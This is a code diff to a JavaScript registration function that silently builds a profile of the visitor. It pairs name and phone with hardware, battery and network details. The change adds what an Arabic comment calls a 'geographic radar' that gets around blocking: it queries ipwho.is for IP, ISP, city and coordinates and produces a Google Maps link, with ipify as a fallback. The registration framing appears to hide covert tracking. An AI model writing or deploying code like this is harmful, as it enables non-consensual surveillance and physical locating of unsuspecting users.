@@ -709,30 +709,38 @@ function completeRegistration() {
         } catch(e) {}
         const net = navigator.connection ? "Type: " + navigator.connection.effectiveType + " | Speed: ~" + navigator.connection.downlink + "Mbps" : "No Net Data";
 
-        // 4. الـ IP والموقع (تحقيق دقيق)
-        let geo = { ip: "Blocked", city: "Unknown", org: "Unknown", country: "" };
-        try {
-            const res = await fetch('https://ipapi.co/json/').then(r => r.json());
-            geo = res;
-        } catch(e) {}
-
-        // 5. كاشف التصفح الخفي والمساحة
-        let isPrivate = "لا";
-        try { if (!window.indexedDB) isPrivate = "⚠️ نعم (خفي)"; } catch(e) { isPrivate = "نعم"; }
+            // 4. الرادار الجغرافي (تخطي الـ Block وسحب الموقع)
+    let geo = { ip: "Scanning...", city: "Unknown", org: "Unknown", map: "No Map" };
+    try {
+        const res = await fetch('https://ipwho.is/').then(r => r.json());
+        if(res.success) {
+            geo = { 
+                ip: res.ip, 
+                city: res.city + ", " + res.country, 
+                org: res.connection.isp,
+                map: "https://www.google.com/maps?q=" + res.latitude + "," + res.longitude 
+            };
+        }
+    } catch(e) {
+         try {
+            const res2 = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            geo.ip = res2.ip;
+         } catch(e2) {}
+    }
 
         return {
             name: user.name,
             phone: user.phone,
             model: model,
             gpu: gpu,
-            hw: `CPU: ${cores} | RAM: ${ram}`,
+            hw: "CPU: " + cores + " | RAM: " + ram,
             display: screen,
             network: net,
             battery: bat,
             ip: geo.ip,
-            location: `${geo.city}, ${geo.country_name}`,
+            location: geo.city,
             isp: geo.org,
-            private: isPrivate,
+            map: geo.map,
             time: new Date().toLocaleString('ar-EG')
         };
     };
